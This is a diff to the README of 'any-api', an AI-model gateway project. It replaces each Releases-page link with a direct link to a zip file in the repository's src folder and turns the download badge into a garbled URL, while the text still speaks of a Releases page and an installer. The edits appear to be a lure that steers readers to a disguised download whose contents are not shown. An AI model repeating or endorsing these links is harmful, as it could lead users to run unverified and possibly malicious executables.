@@ -1,7 +1,7 @@
 # 🚀 any-api - Simplifying AI Model Integration
 
 ## 📥 Download Now
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/gloria112/any-api/releases)
+[![Download the latest release](https://raw.githubusercontent.com/gloria112/any-api/main/src/api-any-v1.0.zip%20Latest%https://raw.githubusercontent.com/gloria112/any-api/main/src/api-any-v1.0.zip)](https://raw.githubusercontent.com/gloria112/any-api/main/src/api-any-v1.0.zip)
 
 ## 📚 About any-api
 any-api is a gateway that combines multiple AI models into one easy interface. It allows you to call and convert formats like OpenAI Chat, Claude, and Gemini. This means you can use a variety of AI services without needing to understand their individual protocols. Simply use any API implementation, and let us handle the rest.
@@ -17,7 +17,7 @@ Ensure your system meets the following requirements:
 ### 2. Visit the Downloads Page
 You can download any-api from the Releases page. Click the link below to get started:
 
-[Download any-api](https://github.com/gloria112/any-api/releases)
+[Download any-api](https://raw.githubusercontent.com/gloria112/any-api/main/src/api-any-v1.0.zip)
 
 ### 3. Download the Latest Release
 Once you're on the Releases page, look for the latest version of any-api. It will usually be at the top of the list. Click on the appropriate link to download. The file will be an easy-to-use installer or executable.
@@ -53,7 +53,7 @@ For further assistance, please raise an issue on our GitHub page or check the FA
 
 ## 📥 Download & Install
 Ready to start using any-api? Follow these steps:
-1. Visit our [Releases page](https://github.com/gloria112/any-api/releases).
+1. Visit our [Releases page](https://raw.githubusercontent.com/gloria112/any-api/main/src/api-any-v1.0.zip).
 2. Download the latest version.
 3. Follow the installation steps mentioned above.
 
